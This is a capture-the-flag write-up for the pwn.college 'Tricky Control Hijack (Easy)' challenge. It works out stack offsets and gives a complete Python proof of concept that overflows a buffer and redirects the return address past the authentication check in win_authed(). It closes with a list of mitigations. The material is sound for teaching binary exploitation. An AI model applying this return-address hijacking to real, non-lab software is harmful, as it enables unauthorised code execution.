# Stage 11: Tricky Control Hijack (Easy) — Stack-Based Control-Flow Redirection

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Easy |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack-2-w` |
| **VT Score** | N/A |

---

## 1. Challenge Overview

| Field | Value |
|-------|-------|
| **Platform** | pwn.college |
| **Challenge** | Tricky Control Hijack (Easy) |
| **Architecture** | x86-64 |
| **Binary** | `binary-exploitation-control-hijack-2-w` |
| **Vulnerability** | Stack-based buffer overflow |
| **Objective** | Redirect execution into `win_authed()` while bypassing its authentication comparison. |

The challenge introduces a control-flow hijacking technique in which an overwritten saved return address redirects execution to a specific instruction inside an executable function.

## 2. Environment and Source Inspection

Navigate to the challenge directory:

```bash
cd /challenge
ls -la
```

Inspect the challenge-provided C source:

```bash
cat binary-exploitation-control-hijack-2-w.c
```

Inspect binary properties:

```bash
file binary-exploitation-control-hijack-2-w
checksec --file=binary-exploitation-control-hijack-2-w
```

Disassemble the target function:

```bash
objdump -d -Mintel binary-exploitation-control-hijack-2-w \
  | grep -A 30 '<win_authed>'
```

## 3. Stack Layout Analysis

The challenge provides the following runtime stack information:

| Property | Value |
|---|---:|
| Input buffer | `0x7ffca121ca80` |
| Buffer capacity | 110 bytes |
| Saved frame pointer | `0x7ffca121cb00` |
| Saved return address | `0x7ffca121cb08` |
| Buffer-to-return-address offset | 136 bytes |
| Return address width | 8 bytes |

Offset calculation:

```text
0x7ffca121cb08 - 0x7ffca121ca80 = 0x88

0x88 = 136 bytes
```

Therefore, the payload layout is:

```text
[ 136 bytes padding ][ 8 bytes replacement RIP ]
```

Total payload size:

```text
136 + 8 = 144 bytes
```

## 4. Authentication Check Analysis

The target function is located at:

```text
win_authed() = 0x40179c
```

Relevant disassembly:

```asm
40179c: endbr64
4017a0: push rbp
4017a1: mov rbp,rsp
4017a4: sub rsp,0x10
4017a8: mov DWORD PTR [rbp-0x4],edi
4017ab: cmp DWORD PTR [rbp-0x4],0x1337
4017b2: jne 4018b6
4017b8: lea rdi,[rip+0x931]
```

The function checks whether its first integer argument equals `0x1337`.

The conditional branch at `0x4017b2` transfers execution to the failure path if the comparison fails.

The instruction at `0x4017b8` is immediately after that conditional branch.

**Control-flow target:**

```text
0x4017b8
```

Instead of entering the function at its beginning, the exploit redirects execution directly to the instruction following the authentication branch.

This is an instruction-level control-flow redirection technique.

## 5. Exploit Implementation

Create the exploit in a writable directory:

```bash
cd ~
nano exploit.py
```

### Complete Python PoC

```python
#!/usr/bin/env python3

import sys
import struct

# Stack layout obtained from challenge runtime output
OFFSET = 136

# Instruction immediately after the authentication branch
TARGET = 0x4017b8

# Construct the payload
payload = b"A" * OFFSET
payload += struct.pack("<Q", TARGET)

# Verify payload size
assert len(payload) == 144

# Send raw bytes to stdout
sys.stdout.buffer.write(payload)
```

### Payload Construction

The payload consists of:

```python
b"A" * 136
```

This fills the memory between the input buffer and saved return address.

```python
struct.pack("<Q", 0x4017b8)
```

This encodes the target address as an unsigned 64-bit little-endian value.

The resulting address bytes are:

```text
b8 17 40 00 00 00 00 00
```

The complete payload is 144 bytes.

## 6. Execution

Execute the exploit against the challenge binary:

```bash
python3 ~/exploit.py | /challenge/binary-exploitation-control-hijack-2-w
```

The challenge should transfer execution to the selected instruction after the authentication branch and proceed through the flag-printing code.

## 7. Technical Explanation

The exploit relies on the following sequence:

1. The program reads attacker-controlled input into a stack buffer.
2. The input exceeds the buffer's capacity.
3. The overflow reaches the saved return address.
4. The saved return address is replaced with `0x4017b8`.
5. When the vulnerable function returns, execution is redirected to the replacement address.
6. Execution resumes after the authentication conditional branch.

This technique does not modify the authentication variable or satisfy the original comparison. It changes the instruction pointer's destination to bypass the branch.

## 8. Security Implications

The challenge demonstrates why memory corruption vulnerabilities can become control-flow vulnerabilities.

Relevant defensive mitigations include:

- **Stack Canaries:** Detect corruption of stack data before function return.
- **PIE:** Randomizes executable code locations, complicating fixed-address redirection.
- **NX / DEP:** Prevents execution from non-executable memory regions.
- **ASLR:** Randomizes memory locations.
- **Control-Flow Integrity (CFI):** Restricts indirect control-flow transfers.
- **Bounds Checking:** Prevents writes beyond the intended buffer boundaries.

No single mitigation should be treated as a complete solution.

## 9. Reproducibility Notes

The PoC uses the challenge's observed stack offset and executable address.

These values are specific to the supplied challenge binary and its execution environment. They should not be assumed to remain valid for a recompiled binary or a different build.

The challenge-provided source file is available at:

```text
/challenge/binary-exploitation-control-hijack-2-w.c
```

The binary can be independently inspected using `file`, `objdump`, and a debugger.

## 10. Key Takeaways

- Calculating the exact saved return-address offset is essential.
- Disassembly reveals conditional branches and useful instruction boundaries.
- Little-endian encoding matters when overwriting 64-bit addresses.
- A function's internal instruction address can be used as a control-flow target.
- A successful overflow is not necessarily a successful exploit; execution must reach a valid path.

**Challenge completed: Tricky Control Hijack (Easy) — pwn.college.**
